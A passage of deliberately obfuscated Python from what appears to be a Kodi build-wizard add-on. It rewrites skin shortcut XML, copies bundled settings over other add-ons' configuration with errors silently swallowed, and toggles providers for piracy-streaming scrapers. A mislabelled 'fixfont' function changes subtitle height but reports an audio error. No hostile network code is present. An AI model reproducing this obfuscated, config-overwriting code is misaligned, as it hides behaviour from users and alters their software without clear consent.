       copyfile (O0O0O000000OOO0O0 ,O0O0O000OO00OO0OO )#line:1166
       O0O0O000000OOO0O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1169
       O0O0O000OO00OO0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1170
       copyfile (O0O0O000000OOO0O0 ,O0O0O000OO00OO0OO )#line:1172
    except :#line:1174
       pass #line:1175
def rdbuildaddonON ():#line:1182
    O00O0O0OO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1184
    with open (O00O0O0OO0000O0O0 ,'r')as OO0000O00000000OO :#line:1185
      O0OOOOOOOO0O0O0O0 =OO0000O00000000OO .read ()#line:1186
    O0OOOOOOOO0O0O0O0 =O0OOOOOOOO0O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1204
    with open (O00O0O0OO0000O0O0 ,'w')as OO0000O00000000OO :#line:1207
      OO0000O00000000OO .write (O0OOOOOOOO0O0O0O0 )#line:1208
    O00O0O0OO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1212
    with open (O00O0O0OO0000O0O0 ,'r')as OO0000O00000000OO :#line:1213
      O0OOOOOOOO0O0O0O0 =OO0000O00000000OO .read ()#line:1214
    O0OOOOOOOO0O0O0O0 =O0OOOOOOOO0O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1232
    with open (O00O0O0OO0000O0O0 ,'w')as OO0000O00000000OO :#line:1235
      OO0000O00000000OO .write (O0OOOOOOOO0O0O0O0 )#line:1236
    O00O0O0OO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1240
    with open (O00O0O0OO0000O0O0 ,'r')as OO0000O00000000OO :#line:1241
      O0OOOOOOOO0O0O0O0 =OO0000O00000000OO .read ()#line:1242
    O0OOOOOOOO0O0O0O0 =O0OOOOOOOO0O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1260
    with open (O00O0O0OO0000O0O0 ,'w')as OO0000O00000000OO :#line:1263
      OO0000O00000000OO .write (O0OOOOOOOO0O0O0O0 )#line:1264
    O00O0O0OO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1268
    with open (O00O0O0OO0000O0O0 ,'r')as OO0000O00000000OO :#line:1269
      O0OOOOOOOO0O0O0O0 =OO0000O00000000OO .read ()#line:1270
    O0OOOOOOOO0O0O0O0 =O0OOOOOOOO0O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1288
    with open (O00O0O0OO0000O0O0 ,'w')as OO0000O00000000OO :#line:1291
      OO0000O00000000OO .write (O0OOOOOOOO0O0O0O0 )#line:1292
    O00O0O0OO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1295
    with open (O00O0O0OO0000O0O0 ,'r')as OO0000O00000000OO :#line:1296
      O0OOOOOOOO0O0O0O0 =OO0000O00000000OO .read ()#line:1297
    O0OOOOOOOO0O0O0O0 =O0OOOOOOOO0O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1315
    with open (O00O0O0OO0000O0O0 ,'w')as OO0000O00000000OO :#line:1318
      OO0000O00000000OO .write (O0OOOOOOOO0O0O0O0 )#line:1319
    O00O0O0OO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1321
    with open (O00O0O0OO0000O0O0 ,'r')as OO0000O00000000OO :#line:1322
      O0OOOOOOOO0O0O0O0 =OO0000O00000000OO .read ()#line:1323
    O0OOOOOOOO0O0O0O0 =O0OOOOOOOO0O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1341
    with open (O00O0O0OO0000O0O0 ,'w')as OO0000O00000000OO :#line:1344
      OO0000O00000000OO .write (O0OOOOOOOO0O0O0O0 )#line:1345
    O00O0O0OO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1347
    with open (O00O0O0OO0000O0O0 ,'r')as OO0000O00000000OO :#line:1348
      O0OOOOOOOO0O0O0O0 =OO0000O00000000OO .read ()#line:1349
    O0OOOOOOOO0O0O0O0 =O0OOOOOOOO0O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1367
    with open (O00O0O0OO0000O0O0 ,'w')as OO0000O00000000OO :#line:1370
      OO0000O00000000OO .write (O0OOOOOOOO0O0O0O0 )#line:1371
    O00O0O0OO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1374
    with open (O00O0O0OO0000O0O0 ,'r')as OO0000O00000000OO :#line:1375
      O0OOOOOOOO0O0O0O0 =OO0000O00000000OO .read ()#line:1376
    O0OOOOOOOO0O0O0O0 =O0OOOOOOOO0O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1394
    with open (O00O0O0OO0000O0O0 ,'w')as OO0000O00000000OO :#line:1397
      OO0000O00000000OO .write (O0OOOOOOOO0O0O0O0 )#line:1398
def rdbuildinstallON ():#line:1401
    try :#line:1403
       OO0OOO00OO0O0O000 =ADDONPATH +"/resources/rd/victory.xml"#line:1404
       O0OOOOOO0O0O00O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1405
       copyfile (OO0OOO00OO0O0O000 ,O0OOOOOO0O0O00O0O )#line:1407
       OO0OOO00OO0O0O000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1409
       O0OOOOOO0O0O00O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1410
       copyfile (OO0OOO00OO0O0O000 ,O0OOOOOO0O0O00O0O )#line:1412
       OO0OOO00OO0O0O000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1414
       O0OOOOOO0O0O00O0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1415
       copyfile (OO0OOO00OO0O0O000 ,O0OOOOOO0O0O00O0O )#line:1417
       OO0OOO00OO0O0O000 =ADDONPATH +"/resources/rd/Splash.png"#line:1420
       O0OOOOOO0O0O00O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1421
       copyfile (OO0OOO00OO0O0O000 ,O0OOOOOO0O0O00O0O )#line:1423
    except :#line:1425
       pass #line:1426
def rdbuild ():#line:1436
	O0OOO0O0O000OOO0O =(ADDON .getSetting ("auto_rd"))#line:1437
	if O0OOO0O0O000OOO0O =='true':#line:1438
		O0000OOO0O00OOOO0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1439
		O0000OOO0O00OOOO0 .setSetting ('all_t','0')#line:1440
		O0000OOO0O00OOOO0 .setSetting ('rd_menu_enable','false')#line:1441
		O0000OOO0O00OOOO0 .setSetting ('magnet_bay','false')#line:1442
		O0000OOO0O00OOOO0 .setSetting ('magnet_extra','false')#line:1443
		O0000OOO0O00OOOO0 .setSetting ('rd_only','false')#line:1444
		O0000OOO0O00OOOO0 .setSetting ('ftp','false')#line:1446
		O0000OOO0O00OOOO0 .setSetting ('fp','false')#line:1447
		O0000OOO0O00OOOO0 .setSetting ('filter_fp','false')#line:1448
		O0000OOO0O00OOOO0 .setSetting ('fp_size_en','false')#line:1449
		O0000OOO0O00OOOO0 .setSetting ('afdah','false')#line:1450
		O0000OOO0O00OOOO0 .setSetting ('ap2s','false')#line:1451
		O0000OOO0O00OOOO0 .setSetting ('cin','false')#line:1452
		O0000OOO0O00OOOO0 .setSetting ('clv','false')#line:1453
		O0000OOO0O00OOOO0 .setSetting ('cmv','false')#line:1454
		O0000OOO0O00OOOO0 .setSetting ('dl20','false')#line:1455
		O0000OOO0O00OOOO0 .setSetting ('esc','false')#line:1456
		O0000OOO0O00OOOO0 .setSetting ('extra','false')#line:1457
		O0000OOO0O00OOOO0 .setSetting ('film','false')#line:1458
		O0000OOO0O00OOOO0 .setSetting ('fre','false')#line:1459
		O0000OOO0O00OOOO0 .setSetting ('fxy','false')#line:1460
		O0000OOO0O00OOOO0 .setSetting ('genv','false')#line:1461
		O0000OOO0O00OOOO0 .setSetting ('getgo','false')#line:1462
		O0000OOO0O00OOOO0 .setSetting ('gold','false')#line:1463
		O0000OOO0O00OOOO0 .setSetting ('gona','false')#line:1464
		O0000OOO0O00OOOO0 .setSetting ('hdmm','false')#line:1465
		O0000OOO0O00OOOO0 .setSetting ('hdt','false')#line:1466
		O0000OOO0O00OOOO0 .setSetting ('icy','false')#line:1467
		O0000OOO0O00OOOO0 .setSetting ('ind','false')#line:1468
		O0000OOO0O00OOOO0 .setSetting ('iwi','false')#line:1469
		O0000OOO0O00OOOO0 .setSetting ('jen_free','false')#line:1470
		O0000OOO0O00OOOO0 .setSetting ('kiss','false')#line:1471
		O0000OOO0O00OOOO0 .setSetting ('lavin','false')#line:1472
		O0000OOO0O00OOOO0 .setSetting ('los','false')#line:1473
		O0000OOO0O00OOOO0 .setSetting ('m4u','false')#line:1474
		O0000OOO0O00OOOO0 .setSetting ('mesh','false')#line:1475
		O0000OOO0O00OOOO0 .setSetting ('mf','false')#line:1476
		O0000OOO0O00OOOO0 .setSetting ('mkvc','false')#line:1477
		O0000OOO0O00OOOO0 .setSetting ('mjy','false')#line:1478
		O0000OOO0O00OOOO0 .setSetting ('hdonline','false')#line:1479
		O0000OOO0O00OOOO0 .setSetting ('moviex','false')#line:1480
		O0000OOO0O00OOOO0 .setSetting ('mpr','false')#line:1481
		O0000OOO0O00OOOO0 .setSetting ('mvg','false')#line:1482
		O0000OOO0O00OOOO0 .setSetting ('mvl','false')#line:1483
		O0000OOO0O00OOOO0 .setSetting ('mvs','false')#line:1484
		O0000OOO0O00OOOO0 .setSetting ('myeg','false')#line:1485
		O0000OOO0O00OOOO0 .setSetting ('ninja','false')#line:1486
		O0000OOO0O00OOOO0 .setSetting ('odb','false')#line:1487
		O0000OOO0O00OOOO0 .setSetting ('ophd','false')#line:1488
		O0000OOO0O00OOOO0 .setSetting ('pks','false')#line:1489
		O0000OOO0O00OOOO0 .setSetting ('prf','false')#line:1490
		O0000OOO0O00OOOO0 .setSetting ('put18','false')#line:1491
		O0000OOO0O00OOOO0 .setSetting ('req','false')#line:1492
		O0000OOO0O00OOOO0 .setSetting ('rftv','false')#line:1493
		O0000OOO0O00OOOO0 .setSetting ('rltv','false')#line:1494
		O0000OOO0O00OOOO0 .setSetting ('sc','false')#line:1495
		O0000OOO0O00OOOO0 .setSetting ('seehd','false')#line:1496
		O0000OOO0O00OOOO0 .setSetting ('showbox','false')#line:1497
		O0000OOO0O00OOOO0 .setSetting ('shuid','false')#line:1498
		O0000OOO0O00OOOO0 .setSetting ('sil_gh','false')#line:1499
		O0000OOO0O00OOOO0 .setSetting ('spv','false')#line:1500
		O0000OOO0O00OOOO0 .setSetting ('subs','false')#line:1501
		O0000OOO0O00OOOO0 .setSetting ('tvs','false')#line:1502
		O0000OOO0O00OOOO0 .setSetting ('tw','false')#line:1503
		O0000OOO0O00OOOO0 .setSetting ('upto','false')#line:1504
		O0000OOO0O00OOOO0 .setSetting ('vel','false')#line:1505
		O0000OOO0O00OOOO0 .setSetting ('vex','false')#line:1506
		O0000OOO0O00OOOO0 .setSetting ('vidc','false')#line:1507
		O0000OOO0O00OOOO0 .setSetting ('w4hd','false')#line:1508
		O0000OOO0O00OOOO0 .setSetting ('wav','false')#line:1509
		O0000OOO0O00OOOO0 .setSetting ('wf','false')#line:1510
		O0000OOO0O00OOOO0 .setSetting ('wse','false')#line:1511
		O0000OOO0O00OOOO0 .setSetting ('wss','false')#line:1512
		O0000OOO0O00OOOO0 .setSetting ('wsse','false')#line:1513
		O0000OOO0O00OOOO0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1514
		O0000OOO0O00OOOO0 .setSetting ('debrid.only','true')#line:1515
		O0000OOO0O00OOOO0 .setSetting ('hosts.captcha','false')#line:1516
		O0000OOO0O00OOOO0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1517
		O0000OOO0O00OOOO0 .setSetting ('provider.123moviehd','false')#line:1518
		O0000OOO0O00OOOO0 .setSetting ('provider.300mbdownload','false')#line:1519
		O0000OOO0O00OOOO0 .setSetting ('provider.alltube','false')#line:1520
		O0000OOO0O00OOOO0 .setSetting ('provider.allucde','false')#line:1521
		O0000OOO0O00OOOO0 .setSetting ('provider.animebase','false')#line:1522
		O0000OOO0O00OOOO0 .setSetting ('provider.animeloads','false')#line:1523
		O0000OOO0O00OOOO0 .setSetting ('provider.animetoon','false')#line:1524
		O0000OOO0O00OOOO0 .setSetting ('provider.bnwmovies','false')#line:1525
		O0000OOO0O00OOOO0 .setSetting ('provider.boxfilm','false')#line:1526
		O0000OOO0O00OOOO0 .setSetting ('provider.bs','false')#line:1527
		O0000OOO0O00OOOO0 .setSetting ('provider.cartoonhd','false')#line:1528
		O0000OOO0O00OOOO0 .setSetting ('provider.cdahd','false')#line:1529
		O0000OOO0O00OOOO0 .setSetting ('provider.cdax','false')#line:1530
		O0000OOO0O00OOOO0 .setSetting ('provider.cine','false')#line:1531
		O0000OOO0O00OOOO0 .setSetting ('provider.cinenator','false')#line:1532
		O0000OOO0O00OOOO0 .setSetting ('provider.cmovieshdbz','false')#line:1533
		O0000OOO0O00OOOO0 .setSetting ('provider.coolmoviezone','false')#line:1534
		O0000OOO0O00OOOO0 .setSetting ('provider.ddl','false')#line:1535
		O0000OOO0O00OOOO0 .setSetting ('provider.deepmovie','false')#line:1536
		O0000OOO0O00OOOO0 .setSetting ('provider.ekinomaniak','false')#line:1537
		O0000OOO0O00OOOO0 .setSetting ('provider.ekinotv','false')#line:1538
		O0000OOO0O00OOOO0 .setSetting ('provider.filiser','false')#line:1539
		O0000OOO0O00OOOO0 .setSetting ('provider.filmpalast','false')#line:1540
		O0000OOO0O00OOOO0 .setSetting ('provider.filmwebbooster','false')#line:1541
		O0000OOO0O00OOOO0 .setSetting ('provider.filmxy','false')#line:1542
		O0000OOO0O00OOOO0 .setSetting ('provider.fmovies','false')#line:1543
		O0000OOO0O00OOOO0 .setSetting ('provider.foxx','false')#line:1544
		O0000OOO0O00OOOO0 .setSetting ('provider.freefmovies','false')#line:1545
		O0000OOO0O00OOOO0 .setSetting ('provider.freeputlocker','false')#line:1546
		O0000OOO0O00OOOO0 .setSetting ('provider.furk','false')#line:1547
		O0000OOO0O00OOOO0 .setSetting ('provider.gamatotv','false')#line:1548
		O0000OOO0O00OOOO0 .setSetting ('provider.gogoanime','false')#line:1549
		O0000OOO0O00OOOO0 .setSetting ('provider.gowatchseries','false')#line:1550
		O0000OOO0O00OOOO0 .setSetting ('provider.hackimdb','false')#line:1551
		O0000OOO0O00OOOO0 .setSetting ('provider.hdfilme','false')#line:1552
		O0000OOO0O00OOOO0 .setSetting ('provider.hdmto','false')#line:1553
		O0000OOO0O00OOOO0 .setSetting ('provider.hdpopcorns','false')#line:1554
		O0000OOO0O00OOOO0 .setSetting ('provider.hdstreams','false')#line:1555
		O0000OOO0O00OOOO0 .setSetting ('provider.horrorkino','false')#line:1557
		O0000OOO0O00OOOO0 .setSetting ('provider.iitv','false')#line:1558
		O0000OOO0O00OOOO0 .setSetting ('provider.iload','false')#line:1559
		O0000OOO0O00OOOO0 .setSetting ('provider.iwaatch','false')#line:1560
		O0000OOO0O00OOOO0 .setSetting ('provider.kinodogs','false')#line:1561
		O0000OOO0O00OOOO0 .setSetting ('provider.kinoking','false')#line:1562
		O0000OOO0O00OOOO0 .setSetting ('provider.kinow','false')#line:1563
		O0000OOO0O00OOOO0 .setSetting ('provider.kinox','false')#line:1564
		O0000OOO0O00OOOO0 .setSetting ('provider.lichtspielhaus','false')#line:1565
		O0000OOO0O00OOOO0 .setSetting ('provider.liomenoi','false')#line:1566
		O0000OOO0O00OOOO0 .setSetting ('provider.magnetdl','false')#line:1569
		O0000OOO0O00OOOO0 .setSetting ('provider.megapelistv','false')#line:1570
		O0000OOO0O00OOOO0 .setSetting ('provider.movie2k-ac','false')#line:1571
		O0000OOO0O00OOOO0 .setSetting ('provider.movie2k-ag','false')#line:1572
		O0000OOO0O00OOOO0 .setSetting ('provider.movie2z','false')#line:1573
		O0000OOO0O00OOOO0 .setSetting ('provider.movie4k','false')#line:1574
		O0000OOO0O00OOOO0 .setSetting ('provider.movie4kis','false')#line:1575
		O0000OOO0O00OOOO0 .setSetting ('provider.movieneo','false')#line:1576
		O0000OOO0O00OOOO0 .setSetting ('provider.moviesever','false')#line:1577
		O0000OOO0O00OOOO0 .setSetting ('provider.movietown','false')#line:1578
		O0000OOO0O00OOOO0 .setSetting ('provider.mvrls','false')#line:1580
		O0000OOO0O00OOOO0 .setSetting ('provider.netzkino','false')#line:1581
		O0000OOO0O00OOOO0 .setSetting ('provider.odb','false')#line:1582
		O0000OOO0O00OOOO0 .setSetting ('provider.openkatalog','false')#line:1583
		O0000OOO0O00OOOO0 .setSetting ('provider.ororo','false')#line:1584
		O0000OOO0O00OOOO0 .setSetting ('provider.paczamy','false')#line:1585
		O0000OOO0O00OOOO0 .setSetting ('provider.peliculasdk','false')#line:1586
		O0000OOO0O00OOOO0 .setSetting ('provider.pelisplustv','false')#line:1587
		O0000OOO0O00OOOO0 .setSetting ('provider.pepecine','false')#line:1588
		O0000OOO0O00OOOO0 .setSetting ('provider.primewire','false')#line:1589
		O0000OOO0O00OOOO0 .setSetting ('provider.projectfreetv','false')#line:1590
		O0000OOO0O00OOOO0 .setSetting ('provider.proxer','false')#line:1591
		O0000OOO0O00OOOO0 .setSetting ('provider.pureanime','false')#line:1592
		O0000OOO0O00OOOO0 .setSetting ('provider.putlocker','false')#line:1593
		O0000OOO0O00OOOO0 .setSetting ('provider.putlockerfree','false')#line:1594
		O0000OOO0O00OOOO0 .setSetting ('provider.reddit','false')#line:1595
		O0000OOO0O00OOOO0 .setSetting ('provider.cartoonwire','false')#line:1596
		O0000OOO0O00OOOO0 .setSetting ('provider.seehd','false')#line:1597
		O0000OOO0O00OOOO0 .setSetting ('provider.segos','false')#line:1598
		O0000OOO0O00OOOO0 .setSetting ('provider.serienstream','false')#line:1599
		O0000OOO0O00OOOO0 .setSetting ('provider.series9','false')#line:1600
		O0000OOO0O00OOOO0 .setSetting ('provider.seriesever','false')#line:1601
		O0000OOO0O00OOOO0 .setSetting ('provider.seriesonline','false')#line:1602
		O0000OOO0O00OOOO0 .setSetting ('provider.seriespapaya','false')#line:1603
		O0000OOO0O00OOOO0 .setSetting ('provider.sezonlukdizi','false')#line:1604
		O0000OOO0O00OOOO0 .setSetting ('provider.solarmovie','false')#line:1605
		O0000OOO0O00OOOO0 .setSetting ('provider.solarmoviez','false')#line:1606
		O0000OOO0O00OOOO0 .setSetting ('provider.stream-to','false')#line:1607
		O0000OOO0O00OOOO0 .setSetting ('provider.streamdream','false')#line:1608
		O0000OOO0O00OOOO0 .setSetting ('provider.streamflix','false')#line:1609
		O0000OOO0O00OOOO0 .setSetting ('provider.streamit','false')#line:1610
		O0000OOO0O00OOOO0 .setSetting ('provider.swatchseries','false')#line:1611
		O0000OOO0O00OOOO0 .setSetting ('provider.szukajkatv','false')#line:1612
		O0000OOO0O00OOOO0 .setSetting ('provider.tainiesonline','false')#line:1613
		O0000OOO0O00OOOO0 .setSetting ('provider.tainiomania','false')#line:1614
		O0000OOO0O00OOOO0 .setSetting ('provider.tata','false')#line:1617
		O0000OOO0O00OOOO0 .setSetting ('provider.trt','false')#line:1618
		O0000OOO0O00OOOO0 .setSetting ('provider.tvbox','false')#line:1619
		O0000OOO0O00OOOO0 .setSetting ('provider.ultrahd','false')#line:1620
		O0000OOO0O00OOOO0 .setSetting ('provider.video4k','false')#line:1621
		O0000OOO0O00OOOO0 .setSetting ('provider.vidics','false')#line:1622
		O0000OOO0O00OOOO0 .setSetting ('provider.view4u','false')#line:1623
		O0000OOO0O00OOOO0 .setSetting ('provider.watchseries','false')#line:1624
		O0000OOO0O00OOOO0 .setSetting ('provider.xrysoi','false')#line:1625
		O0000OOO0O00OOOO0 .setSetting ('provider.library','false')#line:1626
def fixfont ():#line:1629
	OOOOO0O0OO0O0OO0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1630
	O00O0O00000O0O000 =json .loads (OOOOO0O0OO0O0OO0O );#line:1632
	O000O0OOO0O000O00 =O00O0O00000O0O000 ["result"]["settings"]#line:1633
	O0O0O00000O00O0O0 =[OO000OO0OOO0OOOO0 for OO000OO0OOO0OOOO0 in O000O0OOO0O000O00 if OO000OO0OOO0OOOO0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1635
	O0000000OOOO0O0O0 =O0O0O00000O00O0O0 ["options"];#line:1636
	OO0OO00O0O000O00O =O0O0O00000O00O0O0 ["value"];#line:1637
	O00OO0000O0OOO0O0 =[OOO0OO000O0O00OOO for (OOO0OO000O0O00OOO ,O00OO0O00O00O00OO )in enumerate (O0000000OOOO0O0O0 )if O00OO0O00O00O00OO ["value"]==OO0OO00O0O000O00O ][0 ];#line:1639
	OO00OOOO0O0000OO0 =(O00OO0000O0OOO0O0 +1 )%len (O0000000OOOO0O0O0 )#line:1641
	O0OO0O000O0OO0O0O =O0000000OOOO0O0O0 [OO00OOOO0O0000OO0 ]["value"]#line:1643
	O0O0OOOO00O00OOO0 =O0000000OOOO0O0O0 [OO00OOOO0O0000OO0 ]["label"]#line:1644
	OOOO000O0OOO00000 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1646
	try :#line:1648
		O00OO0O000OOO0O00 =json .loads (OOOO000O0OOO00000 );#line:1649
		if O00OO0O000OOO0O00 ["result"]!=True :#line:1651
			raise Exception #line:1652
	except :#line:1653
		sys .stderr .write ("Error switching audio output device")#line:1654
		raise Exception #line:1655
def parseDOM2 (O0O00O00OOOO0OO00 ,name =u"",attrs ={},ret =False ):#line:1656
	if isinstance (O0O00O00OOOO0OO00 ,str ):#line:1659
		try :#line:1660
			O0O00O00OOOO0OO00 =[O0O00O00OOOO0OO00 .decode ("utf-8")]#line:1661
		except :#line:1662
			O0O00O00OOOO0OO00 =[O0O00O00OOOO0OO00 ]#line:1663
	elif isinstance (O0O00O00OOOO0OO00 ,unicode ):#line:1664
		O0O00O00OOOO0OO00 =[O0O00O00OOOO0OO00 ]#line:1665
	elif not isinstance (O0O00O00OOOO0OO00 ,list ):#line:1666
		return u""#line:1667
	if not name .strip ():#line:1669
		return u""#line:1670
	O000000OOO0O00OOO =[]#line:1672
	for O0O00O000000OOOO0 in O0O00O00OOOO0OO00 :#line:1673
		OOOOO00O0O000OO0O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0O00O000000OOOO0 )#line:1674
		for OOOO00OO000000O00 in OOOOO00O0O000OO0O :#line:1675
			O0O00O000000OOOO0 =O0O00O000000OOOO0 .replace (OOOO00OO000000O00 ,OOOO00OO000000O00 .replace ("\n"," "))#line:1676
		OOOOO0000OOOOO000 =[]#line:1678
		for O00O00O00OOO0OOOO in attrs :#line:1679
			O0O000000O0OOO000 =re .compile ('(<'+name +'[^>]*?(?:'+O00O00O00OOO0OOOO +'=[\'"]'+attrs [O00O00O00OOO0OOOO ]+'[\'"].*?>))',re .M |re .S ).findall (O0O00O000000OOOO0 )#line:1680
			if len (O0O000000O0OOO000 )==0 and attrs [O00O00O00OOO0OOOO ].find (" ")==-1 :#line:1681
				O0O000000O0OOO000 =re .compile ('(<'+name +'[^>]*?(?:'+O00O00O00OOO0OOOO +'='+attrs [O00O00O00OOO0OOOO ]+'.*?>))',re .M |re .S ).findall (O0O00O000000OOOO0 )#line:1682
			if len (OOOOO0000OOOOO000 )==0 :#line:1684
				OOOOO0000OOOOO000 =O0O000000O0OOO000 #line:1685
				O0O000000O0OOO000 =[]#line:1686
			else :#line:1687
				O0OO0O00OO0000OOO =range (len (OOOOO0000OOOOO000 ))#line:1688
				O0OO0O00OO0000OOO .reverse ()#line:1689
				for OOO0O0OO00O0O0OOO in O0OO0O00OO0000OOO :#line:1690
					if not OOOOO0000OOOOO000 [OOO0O0OO00O0O0OOO ]in O0O000000O0OOO000 :#line:1691
						del (OOOOO0000OOOOO000 [OOO0O0OO00O0O0OOO ])#line:1692
